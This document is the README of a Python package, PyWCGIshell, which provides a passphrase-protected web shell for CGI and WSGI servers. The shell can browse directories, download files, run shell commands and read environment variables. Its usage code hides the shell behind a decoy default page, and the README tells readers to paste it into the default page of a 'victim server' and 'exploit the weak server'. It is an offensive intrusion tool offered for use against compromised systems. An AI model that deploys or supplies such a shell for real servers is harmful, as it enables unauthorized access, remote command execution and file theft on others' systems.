# PyWCGIshell

## Description
This package implement a WebShell for CGI and WSGI server.

With this WebShell you can:
 - explore directories and download files
 - send a command line (with a history command)
 - get basic informations about environment server
 - get the environments variables

## Requirements
This package require :
 - python3
 - python3 Standard Library

## Installation
```bash
pip install PyWCGIshell
```

## Usages

### Command line:
(Command line is useful to try the webshell only)
```bash
python3 -m PyWCGIshell wsgi # Try it in wsgi mode
```

### Python script
```python
from PyWCGIshell import WebShell

def my_default_cgi_page():
	print("")
	print("Hello World !")

webshell = WebShell()

webshell.type = "cgi" or "wsgi"
webshell.passphrase = "$HELL"
webshell.pass_type = "url" or "body" or "arguments" or "header_value" or "method"
webshell.standard_page = my_default_cgi_page

webshell.run()
```

To use this WebShell:
 - Configure and copy the WebShell code (server type, passphrase and passphrase location)
 - Paste it in the default page of the victim server
 - Send a request with the passphrase and exploit the weak server

## Links
 - [Github Page](https://github.com/mauricelambert/PyWCGIshell/)
 - [Documentation](https://mauricelambert.github.io/info/python/security/PyWCGIshell.html)
 - [Pypi package](https://pypi.org/project/PyWCGIshell/)

## Licence
Licensed under the [GPL, version 3](https://www.gnu.org/licenses/).
